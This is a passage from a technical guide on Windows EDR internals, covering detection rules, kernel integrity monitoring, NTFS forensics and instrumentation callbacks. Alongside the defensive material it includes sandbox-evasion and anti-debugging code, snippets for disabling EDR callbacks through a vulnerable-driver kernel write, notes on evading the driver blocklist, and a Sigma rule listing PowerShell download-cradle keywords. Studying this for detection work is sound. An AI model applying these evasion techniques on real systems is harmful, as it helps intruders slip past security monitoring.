//    Malware sleeps 10 minutes then checks if only 1 second elapsed → sandbox
Sleep(600000); // 10 minutes
ULONG64 elapsed = GetTickCount64();
if (elapsed < 5000) { /* time was accelerated → sandbox */ }

// 2. User interaction check
// EDR sandboxes are headless — no real user
LASTINPUTINFO lii = {sizeof(LASTINPUTINFO)};
GetLastInputInfo(&lii);
DWORD idleTime = GetTickCount() - lii.dwTime;
if (idleTime > 300000) { /* no user input in 5 min → sandbox */ }

// 3. Process count check
// Production machine: 100+ processes
// EDR sandbox: 20-30 minimal processes
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
// Count processes; if < 50 → sandbox

// 4. Screen resolution
// Sandbox often: 1024x768 or headless (0x0)
// Production: 1920x1080 or larger
int width = GetSystemMetrics(SM_CXSCREEN);
if (width < 1024) { /* sandbox */ }

// 5. MAC address vendor check
// Common VMs: VMware (00:0C:29:*), VirtualBox (08:00:27:*)
// Physical: random vendor

// 6. CPU core count
// Sandboxes often: 1-2 cores
// Production workstation: 4-8+ cores
SYSTEM_INFO si; GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 4) { /* sandbox */ }

// 7. DLL presence check
// VMware: vm3dgl.dll, vmhgfs.dll
// VirtualBox: vboxguest.dll, vboxservice.exe presence

// EDR Sandbox Counter-measures:
// → Accelerate time (sleep calls return immediately)
// → Simulate user input events
// → Deploy full production-like images (not minimal)
// → More CPU cores allocated
// → Strip VM artifacts (use bare metal or remove VM DLLs)
// → Random process list augmentation
```

### 43.4 Kernel Anti-Debugging (Advanced Techniques)

```c
// 1. KdDebuggerEnabled check
// Kernel debugger present flag accessible from user mode via NtQuerySystemInformation
ULONG kd;
NtQuerySystemInformation(SystemKernelDebuggerInformation, &kd, sizeof(kd), NULL);
// Returns: KernelDebuggerEnabled + KernelDebuggerNotPresent

// 2. Hardware breakpoint check (debug registers)
CONTEXT ctx = {CONTEXT_DEBUG_REGISTERS};
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { /* hardware BP set → debugger */ }

// 3. INT 3 scanning
// Debuggers insert 0xCC (INT 3) breakpoints
// Malware can scan its own code section for 0xCC bytes
PBYTE code = (PBYTE)GetModuleHandle(NULL);
for (ULONG i = 0; i < module_size; i++) {
    if (code[i] == 0xCC) { /* breakpoint detected */ }
}

// EDR counter: 
// → Nirvana instrumentation callback detects CONTEXT_DEBUG_REGISTERS reads
// → EtwTiLogSetContextThread fires if EDR's own debug registers are read
// → INT 3 scanning: detectable as unusual self-read pattern
```

---

## SECTION 44: Detection Engineering — Sigma, KQL, and Behavioral Rules

### 44.1 Sigma Rules for EDR

Sigma is a vendor-neutral format for expressing security detection rules:

```yaml
# Example: Detect PowerShell download cradle (common initial access)
title: PowerShell Download Cradle
id: 3b6ab547-8ec2-4991-b9d2-2b06702a48c0
status: stable
description: Detects PowerShell downloading and executing files from the internet
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://lolbas-project.github.io/lolbas/Binaries/Powershell/
author: EDR Research
date: 2024/01/15
tags:
    - attack.execution
    - attack.t1059.001
    - attack.command_and_control
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'iex'
            - 'Invoke-Expression'
            - 'IEX'
            - 'IWR'
            - 'Invoke-WebRequest'
            - 'WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Net.WebClient'
    condition: selection
falsepositives:
    - Legitimate admin scripts
    - Software deployment systems
level: high

---
# Example: Detect LSASS memory access
title: LSASS Memory Access by Non-System Process
id: fa34b441-961a-42fa-a100-ecc28c886725
status: stable
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'   # PROCESS_QUERY_LIMITED + PROCESS_VM_READ
            - '0x1410'   # PROCESS_QUERY_INFO + VM_READ + VM_OPERATION
            - '0x143a'   # Full memory access pattern
    filter_svchost:
        SourceImage|startswith: 'C:\Windows\System32\svchost.exe'
    filter_werfault:
        SourceImage|endswith: '\WerFault.exe'
    condition: selection and not 1 of filter_*
level: high
tags:
    - attack.credential_access
    - attack.t1003.001
```

### 44.2 KQL (Kusto Query Language) for MDE Threat Hunting

```kusto
// Hunt for direct syscall patterns (return address outside ntdll)
DeviceEvents
| where ActionType == "MemoryOperation"
| extend CallStack = parse_json(AdditionalFields).CallStack
| mv-expand CallerFrame = CallStack
| where CallerFrame !startswith "C:\\Windows\\System32\\ntdll.dll"
    and CallerFrame !startswith "C:\\Windows\\System32\\win32u.dll"
| summarize count() by DeviceName, InitiatingProcessFileName, CallerFrame
| where count_ > 5

---
// Hunt for LSASS access patterns
DeviceEvents
| where ActionType == "OpenProcess"
| extend TargetProcess = parse_json(AdditionalFields).TargetProcess
| where TargetProcess contains "lsass.exe"
| where InitiatingProcessFileName !in~ 
    ("SecurityHealthService.exe", "MsMpEng.exe", "svchost.exe", "csrss.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, 
          InitiatingProcessCommandLine, AdditionalFields

---
// Hunt for DGA-like DNS queries (high entropy domains)
DeviceNetworkEvents
| where ActionType == "DnsQueryResponse"
| extend QueryName = RemoteUrl
| where QueryName matches regex @"[a-z0-9]{15,}"   // long random-looking subdomain
| extend DomainEntropy = log(32.0) * strlen(split(QueryName, ".")[0])  // approximation
| where DomainEntropy > 50  // high entropy threshold
| summarize count() by DeviceName, InitiatingProcessFileName, QueryName
| where count_ > 3  // multiple high-entropy queries = DGA

---
// Hunt for BYOVD patterns (suspicious driver load followed by callback removal)
DeviceEvents
| where ActionType == "DriverLoad"
| join kind=inner (
    DeviceEvents
    | where ActionType == "ProcessHollowing" or ActionType == "KernelCallbackRemoval"
    | where Timestamp > ago(10m)
) on DeviceId
| where DriverLoaded !in (KnownGoodDrivers)
| project Timestamp, DeviceName, DriverLoaded, ActionType1
```

### 44.3 MITRE ATT&CK Mapping to EDR Telemetry

```
TACTIC: Initial Access
  T1566 Phishing:
    → Email attachment open (outlook.exe) → document launch → suspicious child process
    → Detection: Parent=Office app, Child=cmd/powershell/wscript/mshta
    
  T1195 Supply Chain Compromise:
    → Trusted binary with anomalous behavior
    → Detection: behavioral deviation from baseline; ML model anomaly

TACTIC: Execution
  T1059.001 PowerShell:
    → AMSI content scan + ETW PowerShell/Operational
    → Detection: encoded commands, download cradles, Reflection
    
  T1055 Process Injection:
    → ETW-TI: ALLOCVM_REMOTE, WRITEVM_REMOTE, CREATETHREAD_REMOTE
    → Detection: cross-process handle + alloc + write + thread sequence
    
  T1106 Native API:
    → Direct syscalls bypassing ntdll hooks
    → Detection: trap frame RIP not in ntdll; Nirvana callback

TACTIC: Persistence
  T1543.003 Windows Service:
    → Registry: Services key creation (CmRegisterCallbackEx)
    → SCM API call to CreateService
    → Detection: service binary in unusual path, unsigned
    
  T1547.001 Registry Run Keys:
    → Registry: Run/RunOnce modification (CmRegisterCallbackEx)
    → Detection: non-installer writing to Run keys
    
  T1546.015 Component Object Model Hijacking:
    → Registry: HKCU\CLSID modification
    → Detection: user CLSID overriding system CLSID for high-privilege caller

TACTIC: Privilege Escalation
  T1134 Access Token Manipulation:
    → SetThreadToken, ImpersonateLoggedOnUser, DuplicateTokenEx
    → Detection: API hooks, ETW security audit events
    
  T1068 Exploitation for Privilege Escalation:
    → Kernel exploit → EPROCESS token overwrite
    → Detection: sudden privilege level change, ETW-TI anomaly

TACTIC: Defense Evasion
  T1562.001 Disable or Modify Tools:
    → BYOVD → callback removal
    → Detection: vulnerable driver load + ETW-TI disable pattern
    
  T1036.005 Match Legitimate Name or Location:
    → DLL sideloading, masquerading binary names
    → Detection: ImageFileName mismatch, signature check
    
  T1055.012 Process Hollowing:
    → VAD: MEM_IMAGE page with non-file-backed content
    → ETW-TI: ALLOCVM_REMOTE + SETTHREADCONTEXT_REMOTE

TACTIC: Credential Access
  T1003.001 LSASS Memory:
    → ObRegisterCallbacks: strip PROCESS_VM_READ from LSASS handles
    → Detection: OpenProcess targeting LSASS by non-trusted process
    
  T1558.003 Kerberoasting:
    → ETW Security Event 4769: TGS requests for SPN accounts
    → Detection: bulk TGS requests from non-privileged user

TACTIC: Lateral Movement
  T1021.006 Windows Remote Management:
    → WFP: WinRM connection (TCP 5985/5986) from workstation
    → Process: wsmprovhost.exe spawning commands
    → Detection: WinRM from non-admin workstation to server

  T1021.002 SMB/Windows Admin Shares:
    → WFP: SMB (TCP 445) with admin share access
    → Minifilter: file write to ADMIN$ path
    → Detection: lateral write to remote C$\Windows\

TACTIC: Exfiltration
  T1041 Exfiltration Over C2 Channel:
    → WFP: large outbound HTTPS to unusual destination
    → DNS: high query volume, base64 in queries
    → Detection: data volume + destination reputation + timing
    
  T1048.003 Non-Application Layer Protocol:
    → WFP: ICMP with large payloads
    → DNS: TXT query exfiltration
    → Raw UDP tunneling on non-DNS ports
```

---

## SECTION 45: EDR Performance Engineering

### 45.1 The Performance Constraint

An EDR must observe everything without being noticed. Performance budgets:

```
Target: < 3% CPU overhead on production workloads
        < 100MB RAM additional usage
        < 5ms latency added to any I/O operation

Sources of overhead:
  1. Kernel callbacks: fire synchronously in caller's context
     → Must be very fast (< 10 microseconds average)
     → Expensive work offloaded to worker threads

  2. Minifilter pre-op: executed in I/O path
     → Must complete before I/O continues
     → Buffer too small → reject op → application error
     → Solution: async pending (FLT_PREOP_PENDING) for large files

  3. ETW emission: ring buffer write (very fast, ~100ns)
     → Consumer processing cost varies by design
     
  4. User-mode hooks: minimal (just trampoline overhead, ~50ns)

  5. Cloud upload: batched, background, not on hot path
```

### 45.2 Work Queue Architecture

```c
// EDR's internal work queuing to offload expensive operations
typedef struct _EDR_WORK_QUEUE {
    KQUEUE     Queue;              // kernel queue object
    HANDLE     WorkerThreads[8];   // 8 worker threads (configurable)
    KSPIN_LOCK Lock;
    ULONG      PendingCount;
    ULONG      DropCount;          // events dropped when queue full
} EDR_WORK_QUEUE;

// Types of work items:
typedef enum _EDR_WORK_TYPE {
    WorkTypeHashFile,             // SHA256 calculation (expensive, background)
    WorkTypeScanMemory,           // memory region scanning
    WorkTypeSymbolLookup,         // resolve return addresses to module+offset
    WorkTypeCloudUpload,          // batch telemetry upload
    WorkTypeAlertGenerate,        // correlation + alert enrichment
    WorkTypeProcessEnrich,        // PEB/token enrichment for new process
} EDR_WORK_TYPE;

// Fast-path: kernel callback → push to queue → return immediately
// Slow-path: worker thread picks up → does expensive work → stores result

// Context storage: use FLT_CONTEXT or EX_RUNDOWN_REF guarded structures
// to safely reference process even after it exits
```

### 45.3 Event Deduplication and Sampling

```c
// Problem: Same behavioral pattern repeated 10,000 times per second
// (e.g., every memory allocation by chrome.exe)
// Solution: Fingerprint-based deduplication

typedef struct _EVENT_FINGERPRINT {
    ULONG ProcessId;
    ULONG EventType;
    ULONG64 KeyAttribute1;  // e.g., target address range
    ULONG64 KeyAttribute2;  // e.g., access mask
} EVENT_FINGERPRINT;

// Hash table: fingerprint → last_seen_time + emit_count
// If fingerprint seen within DEDUP_WINDOW (1 second):
//   → Increment counter, do NOT emit again
// After DEDUP_WINDOW:
//   → Emit summary: "repeated N times in last second"
//   → Reset fingerprint entry

// Sampling for high-volume events:
// RWX allocations by Chrome: sample 1-in-100 (JIT is expected)
// RWX allocations by lsass.exe: sample 1-in-1 (every one is suspicious)
// Sampling rate is per-process configurable from cloud policy
```

---

## SECTION 46: Kernel Integrity Monitoring Beyond PatchGuard

### 46.1 EDR as PatchGuard Companion

PatchGuard runs on a timer and verifies specific structures. EDR adds **event-driven monitoring** at much higher frequency:

```
PatchGuard limitations:
  → Checks every 5-10 minutes (random jitter)
  → Attacker can: modify callback → do malicious thing → restore callback
    (all within the PatchGuard check window)
  → PatchGuard protects code sections but NOT data structures in NONPAGED POOL
  
EDR fills the gap:
  → Checks callback arrays on EVERY suspicious event
  → If callback array is modified → immediate alert
  → Can re-register callbacks if removed (self-healing)
  → Cross-validates kernel structure integrity continuously
```

### 46.2 Self-Protection via Kernel Verification

```c
// EDR kernel driver self-integrity:

// 1. Hash own driver image on load
UCHAR ownHash[32];
CalculateSHA256(gDriverBase, gDriverSize, ownHash);

// 2. Periodic re-hash and compare (in system thread)
VOID IntegrityVerificationThread(PVOID unused) {
    while (TRUE) {
        KeDelayExecutionThread(KernelMode, FALSE, &VERIFY_INTERVAL);
        
        UCHAR currentHash[32];
        CalculateSHA256(gDriverBase, gDriverSize, currentHash);
        
        if (memcmp(ownHash, currentHash, 32) != 0) {
            // Own driver has been modified!
            KeBugCheckEx(0xDEADEDR, 0, 0, 0, 0); // or: trigger alert + remediate
        }
        
        // Also verify: are our callbacks still registered?
        BOOLEAN callbackStillPresent = VerifyCallbackPresence(
            gProcessCallback, PspCreateProcessNotifyRoutine_address);
        if (!callbackStillPresent) {
            // Re-register (if not BYOVD'd):
            PsSetCreateProcessNotifyRoutineEx(gProcessCallback, FALSE);
        }
    }
}

// 3. ETW-TI self-monitoring: verify EtwThreatIntProvRegHandle.IsEnabled
//    If zero'd → attempt to re-enable (may not work if BYOVD)
//    → Generate alert via out-of-band channel (direct write to shared memory / ALPC)
```

### 46.3 Hypervisor-Assisted Integrity (HVCI Integration)

When HVCI is enabled, the hypervisor can enforce additional invariants that PatchGuard cannot:

```
HVCI protects (via SLAT/EPT write protection):
  → All kernel code pages (ntoskrnl.exe, HAL, NDIS, etc.)
  → Kernel driver code pages (.text sections)
  → Page tables themselves (EPT protects page table pages)

What this means for EDR:
  → Attacker cannot patch ntdll!EtwEventWrite in kernel context
  → Attacker cannot inject shellcode into ntoskrnl .text section
  → Attacker's BYOVD exploited driver can write to DATA pages (callbacks)
    but NOT CODE pages (cannot redirect execution via code patching)

Remaining BYOVD surface under HVCI:
  → Data-only attacks: zero callback pointers, modify EPROCESS fields
  → EPROCESS.Protection modification: still works (NONPAGED POOL data)
  → ETW_REG_ENTRY.IsEnabled zeroing: still works (NONPAGED POOL data)
  → PspCreateProcessNotifyRoutine array: still works (NONPAGED POOL data)
  
VTL1 (Secure Kernel) additional protections:
  → EPROCESS.Protection level: some builds have VTL1-backed validation
  → KMCI (Kernel Mode Code Integrity) hashes: protected in VTL1
  → Cannot be modified even with ring-0 arbitrary write in VTL0
```

---

## SECTION 47: DPC and Work Item Abuse Detection

### 47.1 Deferred Procedure Calls (DPC)

DPCs run at `DISPATCH_LEVEL` (IRQL 2), above normal thread priority but below hardware interrupt level. They're used for:
- Timer callbacks
- I/O completion
- Network packet processing

```c
// Legitimate DPC usage:
KDPC dpc;
KeInitializeDpc(&dpc, MyDpcRoutine, contextPtr);
// Insert to DPC queue (executes asynchronously at DISPATCH_LEVEL)
KeInsertQueueDpc(&dpc, NULL, NULL);

// KDPC structure:
typedef struct _KDPC {
    union {
        ULONG TargetInfoAsUlong;
        struct {
            UCHAR Type;         // DPC type (Normal, ThreadedDpc, etc.)
            UCHAR Importance;   // LowImportance, MediumImportance, HighImportance
            volatile USHORT Number;  // processor number (for targeted DPCs)
        };
    };
    SINGLE_LIST_ENTRY DpcListEntry;  // linked in per-processor DPC queue
    KAFFINITY ProcessorHistory;      // which processors have run this DPC
    PKDEFERRED_ROUTINE DeferredRoutine;  // ← function to call
    PVOID DeferredContext;
    PVOID SystemArgument1;
    PVOID SystemArgument2;
    volatile PVOID DpcData;
} KDPC, *PKDPC;
```

**DPC as attack vector**: A BYOVD driver can insert a DPC with a malicious `DeferredRoutine` pointing to shellcode. This executes at DISPATCH_LEVEL with no thread context — effectively rootkit-level execution.

**EDR detection**: 
- `DeferredRoutine` not pointing to loaded kernel module code
- HVCI + kCFG: `DeferredRoutine` must be CFG-valid (cannot point to arbitrary shellcode)
- `KeInsertQueueDpc` with `KDPC.DeferredRoutine` not in kernel module range

### 47.2 Work Items (PASSIVE_LEVEL Execution)

```c
// PIO_WORKITEM for kernel work items:
PIO_WORKITEM workItem = IoAllocateWorkItem(deviceObject);
IoQueueWorkItem(workItem, MyWorkItemRoutine, DelayedWorkQueue, context);

// Work item executes in system worker thread at PASSIVE_LEVEL
// Legitimate use: async file operations, deferred processing
// Attack use: execute code in system worker thread context (SYSTEM token)

// Detection:
// → Work item routine address not in any loaded kernel module
//   (similar to DPC attack but at PASSIVE_LEVEL)
// → HVCI + kCFG prevents this (CFG check on function pointer)
```

---

## SECTION 48: Windows Security Center Integration

### 48.1 WSC Registration Protocol

For an EDR to display in Windows Security Center and access some protected features, it must register with the WSC (Windows Security Center) service:

```c
// EDR registration with Windows Security Center:
// Implemented via WSC COM interfaces:

// IWSCProductList interface:
IWSCProductList *pProductList;
CoCreateInstance(CLSID_WSCProductList, NULL, CLSCTX_INPROC_SERVER,
                 IID_IWSCProductList, (void**)&pProductList);
pProductList->Initialize(WSC_SECURITY_PROVIDER_ANTIVIRUS);

// Each registered product:
// ProductName: "CrowdStrike Falcon"
// ProductState: WSC_SECURITY_PRODUCT_STATE_ON / OFF / SNOOZED / EXPIRED
// SignatureStatus: WSC_SECURITY_SIGNATURE_STATUS_OK / OUT_OF_DATE
// RemedyString: "Update your definitions" (shown to user)
// ProductStateTimestamp: when state last changed

// Why registration matters:
// → WSC status shown in Windows Security app
// → Some features require WSC AV registration (Action Center integration)
// → WSC integration required for ELAM certificate chain validation
// → Unregistered AV/EDR: Windows activates Defender as fallback
```

### 48.2 WSC Tampering Detection

```c
// Malware can tamper with WSC to show "security on" while EDR is disabled:
// Attack: modify WSC database to report product as ON even if killed
//   HKLM\SOFTWARE\Microsoft\Security Center\Monitoring\*
//   Or via WSC API with forged state

// EDR counter:
// → WSC queries actual service status, not just registry
// → Service running check: OpenSCManager → QueryServiceStatus
// → Heartbeat mechanism: EDR must periodically re-register with WSC
// → Lapse in heartbeat → WSC marks as "monitoring disabled"
//   → Windows re-enables Defender as backup
```

---

## SECTION 49: NTFS and File System Security Artifacts

### 49.1 MFT (Master File Table) as EDR Data Source

```
NTFS MFT Record Structure:
  ┌─────────────────────────────────────────────────────────┐
  │ FILE_RECORD_HEADER                                      │
  │   Magic: "FILE"                                        │
  │   Sequence: (version counter)                          │
  │   LinkCount: (number of directory entries)             │
  │   FirstAttributeOffset                                 │
  │   Flags: IN_USE, IS_DIRECTORY                         │
  └─────────────────────────────────────────────────────────┘
  │ $STANDARD_INFORMATION Attribute (0x10)                  │
  │   CreationTime      ← user-stampable (timestomping)    │
  │   ModificationTime  ← user-stampable                   │
  │   MFTRecordChangeTime ← set by NTFS on record change   │
  │   AccessTime        ← user-stampable                   │
  │   FileAttributes (Hidden, System, ReadOnly, etc.)      │
  └─────────────────────────────────────────────────────────┘
  │ $FILE_NAME Attribute (0x30)                            │
  │   ParentDirectory: MFT reference                       │
  │   CreationTime      ← NOT directly user-stampable!     │
  │   ModificationTime  ← set by NTFS on actual changes    │
  │   MFTRecordChangeTime                                   │
  │   AccessTime                                           │
  │   AllocatedSize                                         │
  │   RealSize                                             │
  │   FileName: (UNICODE)                                  │
  └─────────────────────────────────────────────────────────┘
  │ $DATA Attribute (0x80): file content or runs           │
  │ $SECURITY_DESCRIPTOR Attribute (0x50)                  │
  │ $INDEX_ROOT / $INDEX_ALLOCATION: (for directories)     │
  └─────────────────────────────────────────────────────────┘
```

**Timestomping detection**: Compare `$STANDARD_INFORMATION` timestamps against `$FILE_NAME` timestamps. `$FN` timestamps are set by NTFS kernel code during file operations and require BYPASS flag not available to user-mode code. If `$SI` timestamps are earlier than `$FN` → impossible without backdating → timestomping.

### 49.2 USN Journal as Forensic Trail

```c
// NTFS USN (Update Sequence Number) Journal
// Records every file system operation in a circular log
// Location: $Extend\$UsnJrnl:$J on each volume

typedef struct {
    DWORD         RecordLength;
    WORD          MajorVersion;
    WORD          MinorVersion;
    DWORDLONG     FileReferenceNumber;
    DWORDLONG     ParentFileReferenceNumber;
    USN           Usn;                      // monotonic counter
    LARGE_INTEGER TimeStamp;               // when operation occurred
    DWORD         Reason;                  // USN_REASON_* flags
    DWORD         SourceInfo;
    DWORD         SecurityId;
    DWORD         FileAttributes;
    WORD          FileNameLength;
    WORD          FileNameOffset;
    WCHAR         FileName[1];             // file name
} USN_RECORD_V2;

// USN_REASON flags (can be OR'd):
// USN_REASON_DATA_OVERWRITE      0x00000001 - file data changed
// USN_REASON_DATA_EXTEND         0x00000002 - file extended
// USN_REASON_DATA_TRUNCATION     0x00000004 - file truncated
// USN_REASON_FILE_CREATE         0x00000100 - file created
// USN_REASON_FILE_DELETE         0x00000200 - file deleted
// USN_REASON_EA_CHANGE           0x00000400 - extended attribute changed
// USN_REASON_SECURITY_CHANGE     0x00000800 - security descriptor changed
// USN_REASON_RENAME_OLD_NAME     0x00001000 - file renamed (old name)
// USN_REASON_RENAME_NEW_NAME     0x00002000 - file renamed (new name)
// USN_REASON_STREAM_CHANGE       0x00200000 - alternate stream changed
// USN_REASON_CLOSE               0x80000000 - file handle closed (final record)

// EDR uses USN journal:
// → Reconstruct file operations even if attacker deleted files
// → Cross-reference with process events (which process wrote file X?)
// → Detect rapid file modification (ransomware: modify thousands of files)
// → Verify: did binary X actually execute even if attacker deleted it?
```

### 49.3 Alternate Data Streams (ADS) as Hiding Vector

```
Zone.Identifier ADS (legitimate):
  file.exe:Zone.Identifier  (track download zone for Gatekeeper-like checks)
  
Malware abuse:
  calc.exe:hidden_payload    (hide DLL/shellcode in ADS, execute from there)
  
Detection:
  → Minifilter: IRP_MJ_CREATE with FileName containing ':' → ADS access
  → NtQueryInformationFile(FileStreamInformation): list all streams
  → Alert: executable content in ADS of non-executable parent file
  → Mark file: Zone.Identifier = Internet → SmartScreen / SAC check
```

---

## SECTION 50: Object Manager and Security Descriptor Auditing

### 50.1 Object Manager Namespace as Security Boundary

```
Object Manager Namespace (\):
  \Device\        → device objects
  \Driver\        → driver objects
  \BaseNamedObjects\   → named kernel objects (events, mutexes, sections)
  \Sessions\0\   → session 0 namespace
  \Sessions\1\   → session 1 (interactive logon)
  \KernelObjects\ → global kernel object directory
  
Security implications:
  → Object names in \BaseNamedObjects\ visible to all processes in same session
  → Attacker can squatter:
    Create \BaseNamedObjects\MyMutex before legitimate app does
    → Legitimate app opens existing mutex (attacker's) → controlled state
    
  → Global namespace: \BaseNamedObjects\Global\...
    Accessible from all sessions including session 0
    Target for service-level object squatting attacks
    
EDR monitoring:
  → ObCreateObjectType / ObOpenObjectByName → object creation/open events
  → Names in \Device\* being created by non-drivers → suspicious
  → Mutex/event/section creation with names matching known-malware patterns
```

### 50.2 Security Descriptor Inspection

```c
// Every kernel object has a security descriptor in OBJECT_HEADER
typedef struct _OBJECT_HEADER {
    LONGLONG PointerCount;    // reference count
    union {
        LONGLONG HandleCount; // handle count  
        PVOID NextToFree;
    };
    EX_PUSH_LOCK Lock;
    UCHAR TypeIndex;          // object type
    union {
        UCHAR TraceFlags;
        struct {
            UCHAR DbgRefTrace  : 1;
            UCHAR DbgTracePermanent : 1;
        };
    };
    UCHAR InfoMask;           // bitmask of optional headers present
    union {
        UCHAR Flags;
        struct {
            UCHAR NewObject         : 1;
            UCHAR KernelObject      : 1;  // ← kernel-only object
            UCHAR KernelOnlyAccess  : 1;  // ← only kernel can access
            UCHAR ExclusiveObject   : 1;
            UCHAR PermanentObject   : 1;
            UCHAR DefaultSecurityQuota : 1;
            UCHAR SingleHandleEntry : 1;
            UCHAR DeletedInline     : 1;
        };
    };
    ULONG Reserved;
    // Optional headers (if InfoMask bits set):
    // OBJECT_HEADER_CREATOR_INFO  → tracks creator
    // OBJECT_HEADER_NAME_INFO     → object name
    // OBJECT_HEADER_HANDLE_INFO   → handle DB
    // OBJECT_HEADER_QUOTA_INFO    → quota charges
    // OBJECT_HEADER_PROCESS_INFO  → owning process (exclusive objects)
    // OBJECT_HEADER_HANDLE_REVOCATION_INFO
    // OBJECT_HEADER_AUDIT_INFO    → SACL for auditing
} OBJECT_HEADER;

// Object body immediately follows:
// PVOID objectBody = (PVOID)((PUCHAR)header + sizeof(OBJECT_HEADER));
// OBJECT_HEADER* header = (OBJECT_HEADER*)((PUCHAR)body - sizeof(OBJECT_HEADER));
```

---

## SECTION 51: Comprehensive BYOVD Driver Vulnerability Taxonomy

### 51.1 Vulnerability Classes in BYOVD Drivers

| Class | Example CVE | Primitive Obtained | Notable Drivers |
|-------|------------|-------------------|-----------------|
| Arbitrary Physical Read/Write | CVE-2019-16098 | Kernel R/W via MmMapIoSpace | RTCore64.sys |
| Arbitrary Kernel Read/Write | CVE-2021-21551 | Direct kernel pointer R/W | dbutil_2_3.sys |
| Arbitrary MSR Read/Write | CVE-2020-12928 | Overwrite LSTAR, read MSRs | AMD ryzen driver |
| Physical Memory Mapping | CVE-2021-31728 | Map physical memory ranges | gigabyte driver |
| Port I/O without restriction | — | Read/write arbitrary ports | many legacy HW drivers |
| Kernel Code Execution | CVE-2019-18932 | Execute shellcode ring-0 | some AV drivers |
| Memory Copy (MmCopyMemory abuse) | — | Read kernel memory | audit tools |
| PCI Config Space | — | DMA-based attacks | FPGA/PCIe drivers |

### 51.2 The Microsoft Vulnerable Driver Blocklist (UEFI WDAC)

```
Blocklist location: 
  In-OS: C:\Windows\System32\CodeIntegrity\driversipolicy.p7b
  UEFI: Stored in UEFI firmware variable (protected by Secure Boot)
  
Format: Binary WDAC policy (signed by Microsoft)
Update mechanism: Windows Update delivers new policy
  
Contents:
  → List of driver hashes (SHA256 of Authenticode hash)
  → List of driver certificates (entire CA chain blocked)
  → Both historical (known bad) and predictive (vulnerable pattern) blocks
  
As of 2026: 300+ individual drivers blocked
Most notable blocks:
  → All RTCore64.sys versions (MSI Afterburner)
  → All gdrv.sys versions (Gigabyte app)  
  → DBUtil_2_3.sys (Dell)
  → Multiple AMD chipset utilities
  → TrueSight anti-rootkit (entire certificate chain)
  → Various Chinese OEM hardware drivers
  
Bypass: 
  → Find driver NOT yet in blocklist (endless cat-and-mouse)
  → Use very old driver + disable WDAC (requires admin+UEFI access)
  → BYOI (Bring Your Own Installer): install then unblock before blocklist applies
```

---

## SECTION 52: Instrumentation Callbacks (Nirvana) — Deep Dive

### 52.1 Nirvana Architecture

The Windows Instrumentation Callback mechanism (officially undocumented, nicknamed "Nirvana") provides a hook that fires on every return from kernel to user mode:

```c
// Setting instrumentation callback:
// NtSetInformationProcess(
//     GetCurrentProcess(),
//     ProcessInstrumentationCallback,  // class 0x28 = 40
//     &callback,
//     sizeof(callback)
// );

// Callback registration structure:
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;    // 0
    ULONG Reserved;
    PVOID Callback;   // user-mode function address
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

// Callback function signature (compiler calling convention: NOT stdcall/fastcall):
// The callback receives:
//   RCX = original CONTEXT (saved CPU state at point of return-to-user-mode)
//   RDX = NTSTATUS return value from syscall
// Callback MUST NOT use SEH, MUST return via RET with original stack balanced

// Where stored: KPROCESS.InstrumentationCallback (offset 0x3D8 on W11)
// Applied: on EVERY iretq/sysret back to user mode from kernel
```

### 52.2 How EDR Uses Nirvana

```c
// EDR's Nirvana callback checks return addresses
VOID CALLBACK NirvanaCallback(PCONTEXT ctx, NTSTATUS returnStatus) {
    // ctx->Rip = where code will resume in user-mode
    // This is the REAL return address (cannot be spoofed)
    
    // Check 1: Is Rip within a known image region?
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery((PVOID)ctx->Rip, &mbi, sizeof(mbi));
    
    if (mbi.Type != MEM_IMAGE) {
        // Return to non-image memory = direct syscall or shellcode
        EmitDirectSyscallAlert(ctx->Rip);
    }
    
    // Check 2: Is Rip within ntdll or win32u?
    if (!IsInNtdll(ctx->Rip) && !IsInWin32u(ctx->Rip)) {
        // Return to non-ntdll image = unusual syscall dispatch
        EmitUnusualSyscallReturn(ctx->Rip);
    }
    
    // Check 3: Stack validation
    // Walk the stack from RSP upward
    // Verify return addresses are in image memory
    ValidateCallStack((PVOID*)ctx->Rsp, MAX_FRAMES);
    
    // Normal execution: do nothing, let code continue at ctx->Rip
}
```

**Why Nirvana is powerful:**
- Fires on EVERY syscall return, not just hooked ones
- Cannot be bypassed by any user-mode technique
- Direct syscalls that bypass ntdll hooks still trigger Nirvana on return
- Stack at time of Nirvana fire is *actual* call stack at syscall point

**Defeating Nirvana (attacker perspective):**
```c
// Option 1: Disable Nirvana by overwriting KPROCESS.InstrumentationCallback
// Requires kernel write (BYOVD)
WriteKernel8(kprocess + 0x3D8, 0);  // NULL = no callback

// Option 2: Set your OWN Nirvana callback (overwrites EDR's)
// Works from admin user-mode (NtSetInformationProcess requires no special privs!)
// EDR counter: monitor InstrumentationCallback via Nirvana itself (recursive check)
//   or via kernel periodic verification

// Option 3: VEH-based evasion: 
// Before syscall: temporarily disable Nirvana, do syscall, re-enable
// Requires two NtSetInformationProcess calls per syscall = observable pattern
```

---

## SECTION 53: PE (Portable Executable) Analysis by EDR

### 53.1 Static PE Analysis at Load Time

When the minifilter's `PsSetLoadImageNotifyRoutine` fires or a file is opened for execution, the EDR performs rapid static analysis:

```c
// PE Analysis checklist (performed in background worker, async):
typedef struct _PE_ANALYSIS_RESULT {
    // Header integrity
    BOOLEAN ValidDosSignature;    // "MZ"
    BOOLEAN ValidPeSignature;     // "PE\0\0"
    BOOLEAN SectionAligned;       // sections correctly aligned
    
    // Import analysis
    ULONG   ImportedFunctionCount;
    BOOLEAN HasSuspiciousImports; // VirtualAlloc+WriteProcessMemory+CreateRemoteThread = suspicious
    WCHAR   SuspiciousImports[MAX_SUSPICIOUS][64];
    
    // Section analysis
    ULONG   SectionCount;
    BOOLEAN HasExecutableData;    // section with both EXECUTE and WRITE = suspicious
